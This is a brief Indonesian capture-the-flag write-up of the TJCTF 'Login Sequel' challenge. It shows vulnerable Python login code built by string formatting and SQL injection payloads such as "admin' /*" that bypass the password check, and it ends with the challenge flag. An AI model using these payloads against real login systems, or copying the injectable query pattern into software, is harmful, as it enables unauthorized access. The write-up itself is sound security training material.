# Login Sequel

## SOAL
![Login sequel](https://user-images.githubusercontent.com/26424136/83002844-bb0c1c80-a037-11ea-972d-124236c9f3ef.PNG)
Tampilan Halaman Login
![login sequel 1](https://user-images.githubusercontent.com/26424136/82976688-f09a1100-a009-11ea-8ce7-222763d7b14c.PNG)

## Penyelesaian
- Masalah injeksi SQL.
- Kita dapat memeriksa kueri dengan melihat sumbernya.
```
def get_user(username, password):
    database = connect_database()
    cursor = database.cursor()
    try:
        cursor.execute('SELECT username, password FROM `userandpassword` WHERE username=\'%s\' AND password=\'%s\'' % (username, hashlib.md5(password.encode())))
    except:
        return render_template("failure.html")
    row = cursor.fetchone()
    database.commit()
    database.close()
    if row is None: return None
    return (row[0],row[1])
```
- Periksa nilai yang difilter
```
admin' || 1=1 #
```
- Saat dicoba memang gagal, tapi hal tersebut tidak menunjukkan kesalahan, jadi itu adalah time based injection dan saya mencoba melakukan _benchmarking_ dan _sleep_. <br />

- Saya memberikan `/ * * /` pada source code tersebut, disini kata sandi dilewati karena sedang diproses <b>md5</b>.
```
username: admin' /*
```
![login sequel 2](https://user-images.githubusercontent.com/26424136/82976691-f1cb3e00-a009-11ea-867e-50549e12ae64.PNG) <br />
Flag telah ditemukan.

## Flag
Flag: <b>tjctf{W0w_wHa1_a_SqL1_exPeRt!}</b> 
